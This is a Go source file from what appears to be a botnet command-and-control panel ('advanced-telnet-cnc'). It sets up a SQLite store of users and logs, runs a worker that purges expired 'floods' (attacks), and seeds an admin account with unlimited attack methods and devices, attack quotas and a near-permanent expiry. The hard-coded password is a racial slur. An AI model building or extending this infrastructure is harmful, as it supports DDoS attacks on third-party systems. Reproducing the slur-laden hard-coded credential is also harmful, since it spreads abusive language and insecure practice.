package database

import (
	"advanced-telnet-cnc/source/config"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"time"
)

var Instance *sql.DB

func Worker() {
	for {
		floods, err := Floods()
		if err != nil {
			continue
		}

		for _, flood := range floods {
			if time.Now().Truncate(24 * time.Hour).After(flood.End) {
				err := flood.Remove()
				if err != nil {
					continue
				}
			}
		}

		time.Sleep(15 * time.Second)
	}
}
func Serve() {
	conn, err := sql.Open("sqlite3", "assets/cnc.sqlite")
	if err != nil {
		config.Logger.Error("Opening the database failed!", "err", err)
		return
	}

	Instance = conn

	err = CreateUserTable()
	if err != nil {
		config.Logger.Error("UserProfile table creation failed!", "err", err)
		return
	}

	err = CreateLogsTable()
	if err != nil {
		config.Logger.Error("Logs table creation failed!", "err", err)
		return
	}

	err = CreateUser(&UserProfile{
		Name:       "admin",
		Password:   "nigger12.",
		Methods:    []int{-1},
		MaxTime:    300,
		MaxAttacks: 100,
		Cooldown:   0,
		Devices:    -1,
		Expiry:     time.Now().Add(99999 * time.Hour),
		Admin:      true,
	}, true)

	go Worker()

	config.Logger.Info("SQLite3 database opened successfully.")
}
